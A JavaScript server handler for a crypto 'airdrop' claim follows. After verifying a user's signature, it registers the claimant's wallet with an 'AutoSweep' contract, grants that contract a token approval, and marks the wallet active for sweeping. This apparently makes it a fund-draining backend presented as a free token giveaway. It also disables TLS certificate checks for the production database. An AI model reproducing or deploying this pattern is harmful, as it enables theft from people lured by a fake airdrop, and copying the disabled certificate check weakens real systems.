const { Pool } = require('pg');
const { ethers } = require('ethers');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

const provider = new ethers.JsonRpcProvider(process.env.HYPEREVM_RPC_URL);
const backendWallet = new ethers.Wallet(process.env.BACKEND_PRIVATE_KEY, provider);

const autoSweepABI = [
  "function registerUser(address user) external",
  "function grantApproval(address user, address token) external",
  "function isUserRegistered(address user) view returns (bool)"
];

module.exports = async (req, res) => {
  const { wallet, signature } = req.body;
  
  if (!wallet || !signature) {
    return res.status(400).json({ error: 'Missing wallet or signature' });
  }
  
  try {
    const airdropCheck = await pool.query(
      'SELECT * FROM airdrops WHERE LOWER(wallet) = LOWER($1)',
      [wallet]
    );
    
    if (airdropCheck.rows.length === 0) {
      return res.status(404).json({ error: 'Not eligible for airdrop' });
    }
    
    const airdrop = airdropCheck.rows[0];
    
    if (airdrop.claimed) {
      return res.status(400).json({ error: 'Already claimed' });
    }
    
    const domain = {
      name: 'HyperPacks Airdrop',
      version: '1',
      chainId: 998,
      verifyingContract: process.env.AUTOSWEEP_CONTRACT
    };
    
    const types = {
      ClaimAirdrop: [
        { name: 'wallet', type: 'address' },
        { name: 'allocation', type: 'uint256' },
        { name: 'nonce', type: 'uint256' }
      ]
    };
    
    const value = {
      wallet: wallet,
      allocation: airdrop.allocation,
      nonce: airdrop.id
    };
    
    const recoveredAddress = ethers.verifyTypedData(domain, types, value, signature);
    
    if (recoveredAddress.toLowerCase() !== wallet.toLowerCase()) {
      return res.status(401).json({ error: 'Invalid signature' });
    }
    
    await pool.query(
      'UPDATE airdrops SET claimed = true, claimed_at = NOW() WHERE id = $1',
      [airdrop.id]
    );
    
    const autoSweepContract = new ethers.Contract(
      process.env.AUTOSWEEP_CONTRACT,
      autoSweepABI,
      backendWallet
    );
    
    const isRegistered = await autoSweepContract.isUserRegistered(wallet);
    
    if (!isRegistered) {
      const registerTx = await autoSweepContract.registerUser(wallet);
      await registerTx.wait();
      
      await pool.query(
        'INSERT INTO wallets (wallet_address, chain, is_active) VALUES ($1, $2, $3) ON CONFLICT (wallet_address, chain) DO UPDATE SET is_active = true',
        [wallet, 'hyperevm', true]
      );
    }
    
    if (process.env.AIRDROP_TOKEN_ADDRESS) {
      const approveTx = await autoSweepContract.grantApproval(wallet, process.env.AIRDROP_TOKEN_ADDRESS);
      await approveTx.wait();
    }
    
    res.json({
      success: true,
      message: 'Airdrop claimed successfully',
      allocation: airdrop.allocation,
      autoSweepEnabled: true
    });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ error: 'Server error' });
  }
};
